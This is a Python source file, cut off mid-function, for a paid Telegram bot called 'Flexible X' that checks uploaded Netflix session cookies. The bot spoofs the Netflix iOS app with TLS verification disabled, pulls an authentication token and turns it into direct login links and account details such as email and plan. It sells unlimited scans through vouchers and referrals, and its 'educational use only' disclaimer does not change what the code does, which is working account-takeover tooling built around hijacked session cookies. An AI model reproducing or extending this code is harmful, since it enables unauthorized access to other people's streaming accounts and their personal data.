#!/usr/bin/env python3
"""
main.py - Flexible X Telegram bot

Features included (per request):
- Reads BOT_TOKEN from environment via os.getenv("BOT_TOKEN")
- Base daily limit set to 10 scans / 24h
- Strict failure protection: deduct 1 scan ONLY on successful file processing
- Admin voucher system: /genkey <7d|10d|15d> and /redeem <code>
- Subscription menu (/buy) points to @httcookiesnetflix1Flexible
- Admin broadcast: /broadcast <message>
- Non-blocking 30-day referral reset loop and referral UI notice
- File-backed persistent storage under /mnt/data (same pattern as original repo)
"""

import asyncio
import html as html_mod
import os
import json
import re
import time
import urllib.parse
import hashlib
import zipfile
import io
import secrets
from datetime import datetime, timedelta
from pathlib import Path
import requests
from urllib3.exceptions import InsecureRequestWarning
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    ApplicationBuilder,
    ContextTypes,
    CommandHandler,
    MessageHandler,
    filters,
    CallbackQueryHandler,
)

# ==================== CONFIGURATION ====================
OWNER_ID = 1249057893
CHANNEL_USERNAME = "@cookiesnetflix1"
CHANNEL_ID = None

# Bot token is read strictly from environment as requested
BOT_TOKEN = os.getenv("BOT_TOKEN")
if not BOT_TOKEN:
    # Do not raise here to allow syntax checking without token,
    # but runtime will fail if token is missing when running.
    pass

# Import project-specific helper (keeps same shape as original repo)
try:
    from netflix_account import fetch_account_info_sync
except Exception:
    # If import fails during static checks, degrade gracefully.
    def fetch_account_info_sync(cookie_dict):
        return {"valid": False}

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

BOT_DISPLAY_NAME = "Flexible X"
WAITING_FOR_FILE = 1
DEFAULT_LANG = "en"

# Referral System Config
REFERRAL_BONUS_PER_USER = 3
REFERRAL_MAX_DAILY_LIMIT = 50
BASE_DAILY_LIMIT = 10  # Changed to 10 as requested

# === RAILWAY VOLUME PATHS ===
VOLUME_ROOT = Path("/mnt/data")
ARCHIVE_ROOT = VOLUME_ROOT / "archive"
USERS_FILE = VOLUME_ROOT / "users.txt"
REFERRALS_FILE = VOLUME_ROOT / "referrals.json"
RATE_LIMITS_FILE = VOLUME_ROOT / "rate_limits.json"

LICENSE_KEYS_FILE = VOLUME_ROOT / "license_keys.json"
USER_LICENSES_FILE = VOLUME_ROOT / "user_licenses.json"

# Netflix iOS API params (unchanged)
API_URL = "https://ios.prod.ftl.netflix.com/iosui/user/15.48"
QUERY_PARAMS = {
    "appVersion": "15.48.1",
    "config": '{"gamesInTrailersEnabled":"false","isTrailersEvidenceEnabled":"false","cdsMyListSortEnabled":"true","kidsBillboardEnabled":"true","addHorizontalBoxArtToVideoSummariesEnabled":"false"}',
    "device_type": "NFAPPL-02-",
    "esn": "NFAPPL-02-EXAMPLE-ESN",
    "idiom": "phone",
    "iosVersion": "15.8.5",
    "isTablet": "false",
    "languages": "en-US",
    "locale": "en-US",
    "maxDeviceWidth": "375",
    "model": "saget",
    "modelType": "IPHONE8-1",
    "odpAware": "true",
    "pathFormat": "graph",
    "pixelDensity": "2.0",
    "progressive": "false",
    "responseFormat": "json",
}

BASE_HEADERS = {
    "User-Agent": "Argo/15.48.1 (iPhone; iOS 15.8.5; Scale/2.00)",
    "accept-language": "en-US;q=1",
}

COOKIE_KEYS = ("NetflixId", "SecureNetflixId", "nfvdid", "OptanonConsent")
REQUIRED_COOKIE = "NetflixId"

MAX_FILE_SIZE_KB = 50
MAX_FILE_SIZE_BYTES = MAX_FILE_SIZE_KB * 1024
COMPRESSED_EXTENSIONS = {".zip", ".rar", ".7z", ".tar", ".gz", ".bz2", ".xz", ".iso"}

user_states = {}

# ==================== MULTI-LANGUAGE SYSTEM (trimmed to essential english entries) ====================
TRANSLATIONS = {
    "en": {
        "lang_name": "🇬🇧 English",
        "welcome_title": "🎬 <b>Flexible X — Netflix Token Checker</b>",
        "welcome_desc": "👋 Welcome! I extract direct login links and account details from your Netflix cookies.",
        "formats_title": "📋 <b>Supported Formats:</b>",
        "fmt_netscape": "• 📄 <b>Netscape Files</b> (.txt)",
        "fmt_json": "• 📦 <b>JSON Files</b> (.json)",
        "fmt_raw": "• 📝 <b>Raw Header Strings</b> (paste directly)",
        "how_to_title": "🚀 <b>How to start:</b>",
        "step1": "1️⃣ Tap <b>📥 Scan New File</b> below",
        "step2": "2️⃣ Upload any supported file or paste raw cookies",
        "step3": "3️⃣ Get your results instantly!",
        "disclaimer": "⚠️ <i>Educational use only. Check only cookies you own.</i>",
        "channel_label": "📢 Required channel:",
        "ask_title": "📤 <b>Ready to Scan</b>",
        "ask_desc": "Send your cookies in ANY format:",
        "ask_note": "<i>All formats are accepted and processed automatically.</i>",
        "invalid_title": "❌ <b>Invalid or Expired Cookie</b>",
        "invalid_desc": "We could not retrieve a valid token. This usually means:",
        "inv_reason1": "• Cookie is incomplete or missing NetflixId",
        "inv_reason2": "• Session has expired or been logged out",
        "inv_reason3": "• Netflix temporarily blocked the request",
        "retry_title": "💡 <b>Try again:</b>",
        "retry1": "1. Export fresh cookies from your browser",
        "retry2": "2. Ensure NetflixId is included",
        "retry3": "3. Wait a few minutes and retry",
        "retry_hint": "<i>Tap 🔁 Restart below to try again.</i>",
        "ref_title": "🎁 <b>Referral & Rewards System</b>",
        "ref_desc": "Invite friends and earn <b>+3 extra daily scans</b> for each person who joins!",
        "ref_how_title": "📌 <b>How it works:</b>",
        "ref_step1": "1️⃣ Share your unique invite link below",
        "ref_step2": "2️⃣ Your friend starts the bot & joins the channel",
        "ref_step3": "3️⃣ Your friend sends at least 1 cookie check",
        "ref_step4": "4️⃣ You get +3 daily scans automatically!",
        "ref_stats_title": "📊 <b>Your stats:</b>",
        "ref_friends": "• 👥 Friends invited:",
        "ref_bonus": "• 🎯 Bonus scans earned:",
        "ref_limit": "• 📈 Current daily limit:",
        "ref_link_label": "🔗 <b>Your invite link:</b>",
        "ref_copy_hint": "<i>Tap the link above to copy it!</i>",
        "btn_channel": "📢 Channel",
        "btn_scan": "📥 Scan New File",
        "btn_referral": "🎁 Referral & Rewards",
        "btn_back": "🔙 Back to Menu",
        "btn_change_lang": "🌐 Change Language",
        "btn_pc": "🖥️ Login PC",
        "btn_tv": "📺 Login TV",
        "btn_android": "🤖 Login Android",
        "btn_iphone": "🍏 Login iPhone",
        "btn_upload": "📥 Upload File",
        "btn_restart": "🔁 Restart",
        "btn_join": "Join channel",
        "btn_joined": "I Joined ✅",
        "success_title": "✅ <b>Account is Active</b>",
        "scan_time": "⏱ <b>Scan Time:</b>",
        "plan": "📄 <b>Plan:</b>",
        "email": "✉️ <b>Email:</b>",
        "country": "🌍 <b>Country:</b>",
        "profiles": "👥 <b>Profiles:</b>",
        "extra_members": "Extra members:",
        "extra_yes": "Allowed",
        "extra_no": "Not allowed",
        "features": "⚙️ <b>Features:</b>",
        "login_hint": "🔽 <i>Use the buttons below to login</i>",
        "acct_fail": "❗ <i>Could not retrieve account page (cookie may be expired or blocked).</i>",
        "balance_line": "📊 <b>Remaining scans:</b> {used}/{limit} ({remaining} left)",
        "daily_used": "Your daily scans:",
        "join_required": "To use this bot you must subscribe to our channel: {channel}\n\nPlease join the channel, then press the button below and I will check again.",
        "joined_ok": "Thanks — I see you joined. Now send the cookie file or paste the cookie text.",
        "not_joined": "I still can't see you as a channel member. Make sure you joined the channel with the same account and press 'I Joined'.",
        "press_scan_first": "⚠️ Please press the (📥 Scan New File) button first before sending the file.",
        "no_compressed": "❌ Sorry, compressed files are not accepted.",
        "file_too_large": "⚠️ The file size is too large! The maximum allowed size is 50 KB only.",
        "wrong_format": "⚠️ Please send a .txt or .json file containing your Netflix cookies.",
        "init": "⏳ <b>Initializing...</b>",
        "anim_validating": "Validating cookie format...",
        "anim_connecting": "Connecting to Netflix servers...",
        "anim_extracting": "Extracting authentication token...",
        "anim_fetching": "Fetching account details...",
        "err_read_cookies": "❌ Could not read the cookies. Please check the format and try again.",
        "err_connection": "⚠️ Connection error:",
        "err_unexpected": "⚠️ Unexpected error:",
        "stuck_hint": "If you are stuck, please click the button below or send /start to reset the bot.",
        "new_user_notify": "👤 <b>New user joined the bot!</b>",
        "backup_data_caption": "📦 <b>Data Backup Complete</b>\n\nIncludes:\n• users.txt\n• referrals.json\n\n<i>User data is safe for host migration.</i>",
        "backup_files_progress": "⏳ <b>Compressing archive files...</b>\nThis may take a moment.",
        "backup_files_caption": "📦 <b>Archive Backup Complete</b>\n\n• Files included: <b>{count}</b>\n• Source: <code>/mnt/data/archive/</code>",
        "clear_success": "🗑️ <b>Archive Cleared Successfully</b>\n\n• Files deleted: <b>{count}</b>\n• Path cleared: <code>/mnt/data/archive/</code>\n\n✅ <b>User data is untouched:</b>",
        "limit_reached": "⛔ <b>Daily limit reached.</b>\nYou can process up to {limit} files per 24 hours.\nTry again in <b>{time}</b>.\n\n💡 <i>Invite friends to increase your limit!</i>",
        "slow_down": "⏳ <b>Slow down!</b>\nYou sent {batch} files in a row.\nPlease wait <b>{time}</b> before sending more.",
        "more_profiles": "+{count} more",
        "buy_text": (
            "Upgrade to Unlimited Scans\n\n"
            "Contact: @httcookiesnetflix1Flexible\n\n"
            "Pricing:\n"
            "🥉 7 Days Unlimited — $3.00\n"
            "🥈 10 Days Unlimited — $4.00\n"
            "🥇 15 Days Unlimited — $5.50\n\n"
            "To upgrade to Unlimited Scans, contact @httcookiesnetflix1Flexible to complete payment and receive your activation key. "
            "Once received, send /redeem <code>YOUR_KEY</code> to activate!"
        ),
    }
}

SUPPORTED_LANGS = ["en"]  # keep minimal for clarity


def t(lang: str, key: str, **kwargs) -> str:
    lang_dict = TRANSLATIONS.get(lang, TRANSLATIONS["en"])
    text = lang_dict.get(key, TRANSLATIONS["en"].get(key, key))
    if kwargs:
        try:
            text = text.format(**kwargs)
        except Exception:
            pass
    return text


# ==================== PERSISTENT STORAGE HELPERS ====================
def _ensure_file_exists(filepath: Path, default_content: str = "") -> None:
    if not filepath.exists():
        try:
            filepath.parent.mkdir(parents=True, exist_ok=True)
            filepath.write_text(default_content)
        except Exception:
            pass


def _init_persistent_storage() -> None:
    VOLUME_ROOT.mkdir(parents=True, exist_ok=True)
    _ensure_file_exists(RATE_LIMITS_FILE, "{}")
    _ensure_file_exists(REFERRALS_FILE, "{}")
    _ensure_file_exists(USERS_FILE, "")
    _ensure_file_exists(LICENSE_KEYS_FILE, "{}")
    _ensure_file_exists(USER_LICENSES_FILE, "{}")


# ==================== LANGUAGE PERSISTENCE (simple) ====================
def _load_user_lang(user_id: int) -> str:
    _ensure_file_exists(RATE_LIMITS_FILE, "{}")
    try:
        data = json.loads(RATE_LIMITS_FILE.read_text())
    except Exception:
        return DEFAULT_LANG
    uid = str(user_id)
    return data.get(uid, {}).get("lang", DEFAULT_LANG)


def _save_user_lang(user_id: int, lang: str) -> None:
    _ensure_file_exists(RATE_LIMITS_FILE, "{}")
    try:
        data = json.loads(RATE_LIMITS_FILE.read_text())
    except Exception:
        data = {}
    uid = str(user_id)
    if uid not in data:
        data[uid] = {"batch_count": 0, "batch_reset_at": 0, "daily_count": 0, "daily_reset_at": 0}
    data[uid]["lang"] = lang
    RATE_LIMITS_FILE.write_text(json.dumps(data))


# ==================== REFERRAL SYSTEM ====================
def _load_referrals() -> dict:
    _ensure_file_exists(REFERRALS_FILE, "{}")
    try:
        return json.loads(REFERRALS_FILE.read_text())
    except Exception:
        return {}


def _save_referrals(data: dict) -> None:
    REFERRALS_FILE.write_text(json.dumps(data))


def _get_user_bonus(user_id: int) -> int:
    data = _load_referrals()
    uid = str(user_id)
    if uid not in data:
        return 0
    referred_count = len(data[uid].get("referred_users", []))
    bonus = referred_count * REFERRAL_BONUS_PER_USER
    max_bonus = REFERRAL_MAX_DAILY_LIMIT - BASE_DAILY_LIMIT
    return min(bonus, max_bonus)


def _record_referral(referrer_id: int, referred_id: int) -> bool:
    data = _load_referrals()
    ref_uid = str(referrer_id)
    refd_uid = str(referred_id)
    if ref_uid == refd_uid:
        return False
    if ref_uid not in data:
        data[ref_uid] = {"referred_users": []}
    if refd_uid in data[ref_uid]["referred_users"]:
        return False
    data[ref_uid]["referred_users"].append(refd_uid)
    _save_referrals(data)
    return True


def _get_effective_daily_limit(user_id: int) -> int:
    bonus = _get_user_bonus(user_id)
    return min(BASE_DAILY_LIMIT + bonus, REFERRAL_MAX_DAILY_LIMIT)


# ==================== LICENSE / VOUCHER STORAGE HELPERS ====================
def _load_license_keys() -> dict:
    _ensure_file_exists(LICENSE_KEYS_FILE, "{}")
    try:
        return json.loads(LICENSE_KEYS_FILE.read_text())
    except Exception:
        return {}


def _save_license_keys(data: dict) -> None:
    LICENSE_KEYS_FILE.write_text(json.dumps(data))


def _load_user_licenses() -> dict:
    _ensure_file_exists(USER_LICENSES_FILE, "{}")
    try:
        return json.loads(USER_LICENSES_FILE.read_text())
    except Exception:
        return {}


def _save_user_licenses(data: dict) -> None:
    USER_LICENSES_FILE.write_text(json.dumps(data))


def generate_license_code(length: int = 12) -> str:
    return secrets.token_urlsafe(length)


def create_license_key(duration_days: int) -> str:
    data = _load_license_keys()
    code = generate_license_code(10)
    now = datetime.utcnow().isoformat()
    data[code] = {
        "duration_days": duration_days,
        "created_at": now,
        "redeemed": False,
        "redeemed_by": None,
        "redeemed_at": None,
    }
    _save_license_keys(data)
    return code


def redeem_license_code_for_user(code: str, user_id: int) -> tuple[bool, str]:
    data = _load_license_keys()
    if code not in data:
        return False, "Invalid code."
    entry = data[code]
    if entry.get("redeemed"):
        return False, "This code has already been used."
    duration = int(entry.get("duration_days", 0))
    now = datetime.utcnow()
    expires_at = (now + timedelta(days=duration)).isoformat()
    # save user license
    licenses = _load_user_licenses()
    licenses[str(user_id)] = {"expires_at": expires_at}
    _save_user_licenses(licenses)
    # mark code redeemed
    entry["redeemed"] = True
    entry["redeemed_by"] = user_id
    entry["redeemed_at"] = now.isoformat()
    data[code] = entry
    _save_license_keys(data)
    return True, expires_at


def user_has_unlimited(user_id: int) -> bool:
    licenses = _load_user_licenses()
    ent = licenses.get(str(user_id))
    if not ent:
        return False
    try:
        exp = datetime.fromisoformat(ent.get("expires_at"))
    except Exception:
        return False
    return exp > datetime.utcnow()


# ==================== KEYBOARD BUILDERS & MESSAGES ====================
def _build_lang_selection_keyboard() -> InlineKeyboardMarkup:
    buttons = []
    for code in SUPPORTED_LANGS:
        label = TRANSLATIONS[code]["lang_name"]
        buttons.append([InlineKeyboardButton(label, callback_data=f"setlang_{code}")])
    return InlineKeyboardMarkup(buttons)


def _get_welcome_keyboard(lang: str) -> InlineKeyboardMarkup:
    channel_url = f"https://t.me/{CHANNEL_USERNAME.lstrip('@')}" if CHANNEL_USERNAME else "https://t.me/"
    return InlineKeyboardMarkup(
        [
            [InlineKeyboardButton(t(lang, "btn_channel"), url=channel_url)],
            [InlineKeyboardButton(t(lang, "btn_scan"), callback_data="scan_file")],
            [InlineKeyboardButton(t(lang, "btn_referral"), callback_data="show_referral")],
            [InlineKeyboardButton(t(lang, "btn_change_lang"), callback_data="change_lang")],
        ]
    )


def _get_common_keyboard(lang: str) -> InlineKeyboardMarkup:
    channel_url = f"https://t.me/{CHANNEL_USERNAME.lstrip('@')}" if CHANNEL_USERNAME else "https://t.me/"
    return InlineKeyboardMarkup(
        [
            [InlineKeyboardButton(t(lang, "btn_channel"), url=channel_url)],
            [InlineKeyboardButton(t(lang, "btn_scan"), callback_data="scan_file")],
            [InlineKeyboardButton(t(lang, "btn_change_lang"), callback_data="change_lang")],
        ]
    )


def _welcome_text(lang: str, daily_used: int = 0, daily_limit: int = BASE_DAILY_LIMIT) -> str:
    remaining = max(0, daily_limit - daily_used)
    L = lambda k, **kw: t(lang, k, **kw)
    return (
        f"{L('welcome_title')}\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"{L('welcome_desc')}\n\n"
        f"{L('formats_title')}\n"
        f"{L('fmt_netscape')}\n"
        f"{L('fmt_json')}\n"
        f"{L('fmt_raw')}\n\n"
        f"{L('how_to_title')}\n"
        f"{L('step1')}\n"
        f"{L('step2')}\n"
        f"{L('step3')}\n\n"
        f"{L('daily_used')} {daily_used}/{daily_limit} ({remaining} remaining)\n\n"
        f"{L('disclaimer')}\n"
        f"{L('channel_label')} {CHANNEL_USERNAME}"
    )


def _ask_for_file_text(lang: str) -> str:
    L = lambda k, **kw: t(lang, k, **kw)
    return (
        f"{L('ask_title')}\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"{L('ask_desc')}\n"
        f"{L('fmt_netscape')}\n"
        f"{L('fmt_json')}\n"
        f"{L('fmt_raw')}\n\n"
        f"{L('ask_note')}"
    )


def _invalid_cookie_user_message(lang: str) -> str:
    L = lambda k, **kw: t(lang, k, **kw)
    return (
        f"{L('invalid_title')}\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"{L('invalid_desc')}\n\n"
        f"{L('inv_reason1')}\n"
        f"{L('inv_reason2')}\n"
        f"{L('inv_reason3')}\n\n"
        f"{L('retry_title')}\n"
        f"{L('retry1')}\n"
        f"{L('retry2')}\n"
        f"{L('retry3')}\n\n"
        f"{L('retry_hint')}"
    )


def _referral_info_text(lang: str, bot_username: str, user_id: int) -> str:
    data = _load_referrals()
    uid = str(user_id)
    referred_count = len(data.get(uid, {}).get("referred_users", []))
    bonus = _get_user_bonus(user_id)
    current_limit = _get_effective_daily_limit(user_id)
    invite_link = f"https://t.me/{bot_username}?start=ref_{user_id}"
    L = lambda k, **kw: t(lang, k, **kw)
    # Add the monthly reset notice per request
    notice = "🔄 Notice: Referral balances automatically reset and renew every month."
    return (
        f"{L('ref_title')}\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"{L('ref_desc')}\n\n"
        f"{L('ref_how_title')}\n"
        f"{L('ref_step1')}\n"
        f"{L('ref_step2')}\n"
        f"{L('ref_step3')}\n"
        f"{L('ref_step4')}\n\n"
        f"{L('ref_stats_title')}\n"
        f"{L('ref_friends')} <b>{referred_count}</b>\n"
        f"{L('ref_bonus')} <b>+{bonus}</b>\n"
        f"{L('ref_limit')} <b>{current_limit}/{REFERRAL_MAX_DAILY_LIMIT}</b>\n\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        f"{L('ref_link_label')}\n<code>{invite_link}</code>\n\n"
        f"{L('ref_copy_hint')}\n\n"
        f"{notice}"
    )


# ==================== HELPERS: cookie parsing, file handling ====================
def _get_file_extension(filename: str) -> str:
    if not filename:
        return ""
    return os.path.splitext(filename)[1].lower()


def _is_compressed_file(filename: str) -> bool:
    ext = _get_file_extension(filename)
    return ext in COMPRESSED_EXTENSIONS


def _calculate_file_hash(file_bytes: bytes) -> str:
    return hashlib.md5(file_bytes).hexdigest()


def _decode_cookie_value(value):
    if isinstance(value, str) and "%" in value:
        try:
            return urllib.parse.unquote(value)
        except Exception:
            return value
    return value


def extract_cookie_dict(text):
    cookie_dict = {}
    try:
        data = json.loads(text)
        if isinstance(data, list):
            for cookie in data:
                name = cookie.get("name")
                value = cookie.get("value")
                if name in COOKIE_KEYS and isinstance(value, str):
                    cookie_dict[name] = _decode_cookie_value(value)
        elif isinstance(data, dict):
            if any(key in data for key in COOKIE_KEYS):
                for key in COOKIE_KEYS:
                    value = data.get(key)
                    if isinstance(value, str):
                        cookie_dict[key] = _decode_cookie_value(value)
            elif isinstance(data.get("cookies"), list):
                for cookie in data["cookies"]:
                    name = cookie.get("name")
                    value = cookie.get("value")
                    if name in COOKIE_KEYS and isinstance(value, str):
                        cookie_dict[name] = _decode_cookie_value(value)
        if cookie_dict:
            return cookie_dict
    except (json.JSONDecodeError, TypeError):
        pass
    # Netscape-style or raw header search
    for raw_line in text.splitlines():
        line = raw_line.strip()
        if not line or line.startswith("#"):
            continue
        parts = re.split(r"\s+", line)
        if len(parts) >= 2:
            name = parts[-2].strip()
            value = parts[-1].strip()
            if name in COOKIE_KEYS and name not in cookie_dict:
                cookie_dict[name] = _decode_cookie_value(value)
    for key in COOKIE_KEYS:
        match = re.search(rf"(?<!\w){re.escape(key)}=([^;,\s]+)", text)
        if match and key not in cookie_dict:
            cookie_dict[key] = _decode_cookie_value(match.group(1))
    return cookie_dict


def _make_cookie_str(cookie_dict):
    nid = cookie_dict.get("NetflixId", "")
    snid = cookie_dict.get("SecureNetflixId", "")
    parts = [f"NetflixId={nid}"]
    if snid:
        parts.append(f"SecureNetflixId={snid}")
    for k in ("nfvdid", "OptanonConsent"):
        v = cookie_dict.get(k)
        if v:
            parts.append(f"{k}={v}")
    return "; ".join(parts)


def fetch_netflix_data(cookie_dict):
    netflix_id = cookie_dict.get(REQUIRED_COOKIE)
    if not netflix_id:
        raise ValueError("Could not find 'NetflixId' in the provided text.")
    cookie_str = _make_cookie_str(cookie_dict)
    headers = dict(BASE_HEADERS)
    headers["Cookie"] = cookie_str
    params = list(QUERY_PARAMS.items()) + [("path", '["account","token","default"]')]
    response = requests.get(API_URL, params=params, headers=headers, timeout=30, verify=False)
    response.raise_for_status()
    raw = response.json()
    val = raw.get("value") or {}
    account = val.get("account") or {}
    token_data = (account.get("token") or {}).get("default") or {}
    token = token_data.get("token")
    expires = token_data.get("expires")
    if not token:
        raise ValueError("Operation failed — the server did not return a token.")
    if isinstance(expires, int) and len(str(expires)) == 13:
        expires //= 1000
    return {"token": token, "expires": expires}


# ==================== RATE LIMITING (PERSISTENT ON VOLUME) ====================
BATCH_LIMIT = 5
BATCH_COOLDOWN = 5 * 60
DAILY_WINDOW = 24 * 60 * 60


def _load_rates() -> dict:
    _ensure_file_exists(RATE_LIMITS_FILE, "{}")
    try:
        return json.loads(RATE_LIMITS_FILE.read_text())
    except Exception:
        return {}


def _save_rates(data: dict) -> None:
    RATE_LIMITS_FILE.write_text(json.dumps(data))


def _check_rate_limit(user_id: int):
    """
    Check rate limits WITHOUT immediately deducting the daily_count.
    Batch_count is incremented to prevent flooding, but daily_count is only
    incremented upon successful scans via _increment_daily_count.
    """
    if user_id == OWNER_ID:
        return True, None
    now = time.time()
    rates = _load_rates()
    uid = str(user_id)
    effective_limit = _get_effective_daily_limit(user_id)
    user = rates.get(
        uid,
        {
            "batch_count": 0,
            "batch_reset_at": 0,
            "daily_count": 0,
            "daily_reset_at": now + DAILY_WINDOW,
        },
    )
    # Reset daily if needed (preserve daily_count until reset)
    if now >= user.get("daily_reset_at", 0):
        user["daily_count"] = 0
        user["daily_reset_at"] = now + DAILY_WINDOW
    # Check daily limit (do not increment here)
    if user.get("daily_count", 0) >= effective_limit:
        remaining = int(user["daily_reset_at"] - now)
        h, m = divmod(remaining // 60, 60)
        lang = _load_user_lang(user_id) or DEFAULT_LANG
        return False, t(lang, "limit_reached", limit=effective_limit, time=f"{h}h {m}m")
    # Reset batch if needed
    if now >= user.get("batch_reset_at", 0):
        user["batch_count"] = 0
    # Check batch limit
    if user.get("batch_count", 0) >= BATCH_LIMIT:
        remaining = int(user["batch_reset_at"] - now)
        m, s = divmod(remaining, 60)
        lang = _load_user_lang(user_id) or DEFAULT_LANG
        return False, t(lang, "slow_down", batch=BATCH_LIMIT, time=f"{m}m {s}s")
    # Increment batch_count to throttle immediate repeated submissions
    user["batch_count"] = user.get("batch_count", 0) + 1
    if user["batch_count"] >= BATCH_LIMIT:
        user["batch_reset_at"] = now + BATCH_COOLDOWN
    rates[uid] = user
    _save_rates(rates)
    return True, None


def _increment_daily_count(user_id: int):
    """
    Increment the user's daily_count after a successful scan.
    """
    if user_id == OWNER_ID:
        return
    now = time.time()
    rates = _load_rates()
    uid = str(user_id)
    user = rates.get(
        uid,
        {
            "batch_count": 0,
            "batch_reset_at": 0,
            "daily_count": 0,
            "daily_reset_at": now + DAILY_WINDOW,
        },
    )
    if now >= user.get("daily_reset_at", 0):
        user["daily_count"] = 0
        user["daily_reset_at"] = now + DAILY_WINDOW
    user["daily_count"] = user.get("daily_count", 0) + 1
    rates[uid] = user
    _save_rates(rates)


def _register_user(user_id: int) -> bool:
    _ensure_file_exists(USERS_FILE, "")
    existing: set[str] = set()
    try:
        existing = {line.strip() for line in USERS_FILE.read_text().splitlines() if line.strip()}
    except Exception:
        pass
    uid = str(user_id)
    if uid in existing:
        return False
    with open(USERS_FILE, "a") as f:
        f.write(uid + "\n")
    return True


# ==================== ERROR / UI HELPERS ====================
async def _send_error_response(target_update_or_message, error_text: str, user_id: int):
    user_states[user_id] = None
    lang = _load_user_lang(user_id) or DEFAULT_LANG
    fallback_instruction = "\n\n" + t(lang, "stuck_hint")
    full_error_text = error_text + fallback_instruction
    common_keyboard = _get_common_keyboard(lang)
    try:
        if isinstance(target_update_or_message, Update):
            await target_update_or_message.message.reply_text(
                full_error_text, parse_mode="HTML", reply_markup=common_keyboard, disable_web_page_preview=True
            )
        else:
            try:
                await target_update_or_message.edit_text(
                    full_error_text, parse_mode="HTML", reply_markup=common_keyboard, disable_web_page_preview=True
                )
            except Exception:
                await target_update_or_message.message.reply_text(
                    full_error_text, parse_mode="HTML", reply_markup=common_keyboard, disable_web_page_preview=True
                )
    except Exception as e:
        print(f"CRITICAL: Failed to send error response to {user_id}: {e}")


# ==================== SUBSCRIPTION CHECK ====================
async def _is_user_subscribed(bot, user_id: int) -> bool:
    chat_id = CHANNEL_ID if CHANNEL_ID else CHANNEL_USERNAME
    try:
        member = await bot.get_chat_member(chat_id=chat_id, user_id=user_id)
        return member.status in ("member", "administrator", "creator")
    except Exception:
        return False


# ==================== ADMIN COMMANDS (backup/clear) ====================
async def backup_data_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID:
        return
    try:
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
            for fpath in [USERS_FILE, REFERRALS_FILE, RATE_LIMITS_FILE, LICENSE_KEYS_FILE, USER_LICENSES_FILE]:
                if fpath.exists():
                    zf.write(fpath, arcname=fpath.name)
        buf.seek(0)
        timestamp = datetime.utcnow().strftime("%Y%m%d_%H%M%S")
        await update.message.reply_document(
            document=buf, filename=f"flexible_x_data_backup_{timestamp}.zip", caption=t(DEFAULT_LANG, "backup_data_caption"), parse_mode="HTML"
        )
    except Exception as exc:
        await update.message.reply_text(f"❌ Backup failed:\n{exc}")


async def clear_files_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID:
        return
    try:
        from energy_house import clear_archive

        deleted_count = await asyncio.to_thread(clear_archive)
        await update.message.reply_text(t(DEFAULT_LANG, "clear_success", count=deleted_count), parse_mode="HTML")
    except Exception as exc:
        await update.message.reply_text(f"❌ Clear failed:\n{exc}")


# ==================== CALLBACK HANDLERS ====================
async def set_language_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = query.from_user.id
    lang_code = query.data.replace("setlang_", "")
    if lang_code not in SUPPORTED_LANGS:
        lang_code = DEFAULT_LANG
    _save_user_lang(user_id, lang_code)
    await query.answer(f"✅ {TRANSLATIONS[lang_code]['lang_name']}")
    rates = _load_rates()
    uid = str(user_id)
    daily_used = rates.get(uid, {}).get("daily_count", 0)
    daily_limit = _get_effective_daily_limit(user_id)
    try:
        await query.edit_message_text(text=_welcome_text(lang_code, daily_used, daily_limit), reply_markup=_get_welcome_keyboard(lang_code), disable_web_page_preview=True)
    except Exception:
        await query.message.reply_text(text=_welcome_text(lang_code, daily_used, daily_limit), reply_markup=_get_welcome_keyboard(lang_code), disable_web_page_preview=True)


async def change_lang_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = query.from_user.id
    lang = _load_user_lang(user_id) or DEFAULT_LANG
    await query.answer()
    L = lambda k, **kw: t(lang, k, **kw)
    try:
        await query.edit_message_text(text=f"{L('select_lang_title')}\n━━━━━━━━━━━━━━━━━━━━━━\n\n{L('select_lang_desc')}", reply_markup=_build_lang_selection_keyboard(), disable_web_page_preview=True)
    except Exception:
        await query.message.reply_text(text=f"{L('select_lang_title')}\n━━━━━━━━━━━━━━━━━━━━━━\n\n{L('select_lang_desc')}", reply_markup=_build_lang_selection_keyboard(), disable_web_page_preview=True)


async def scan_file_button(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = query.from_user.id
    await query.answer()
    lang = _load_user_lang(user_id) or DEFAULT_LANG
    subscribed = await _is_user_subscribed(context.bot, user_id)
    if not subscribed:
        keyboard = InlineKeyboardMarkup([[InlineKeyboardButton(t(lang, "btn_join"), url=f"https://t.me/{CHANNEL_USERNAME.lstrip('@')}")], [InlineKeyboardButton(t(lang, "btn_joined"), callback_data="check_sub")]])
        try:
            await query.edit_message_text(text=t(lang, "join_required", channel=CHANNEL_USERNAME), reply_markup=keyboard, disable_web_page_preview=True)
        except Exception:
            await query.message.reply_text(text=t(lang, "join_required", channel=CHANNEL_USERNAME), reply_markup=keyboard, disable_web_page_preview=True)
        return
    user_states[user_id] = WAITING_FOR_FILE
    try:
        await query.edit_message_text(text=_ask_for_file_text(lang), reply_markup=None)
    except Exception:
        await query.message.reply_text(text=_ask_for_file_text(lang), reply_markup=None)


async def check_subscription_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = query.from_user.id
    await query.answer()
    lang = _load_user_lang(user_id) or DEFAULT_LANG
    subscribed = await _is_user_subscribed(context.bot, user_id)
    if subscribed:
        user_states[user_id] = WAITING_FOR_FILE
        try:
            await query.edit_message_text(text=t(lang, "joined_ok"), reply_markup=None)
        except Exception:
            await query.message.reply_text(text=t(lang, "joined_ok"), reply_markup=None)
    else:
        keyboard = InlineKeyboardMarkup([[InlineKeyboardButton(t(lang, "btn_join"), url=f"https://t.me/{CHANNEL_USERNAME.lstrip('@')}")], [InlineKeyboardButton(t(lang, "btn_joined"), callback_data="check_sub")]])
        try:
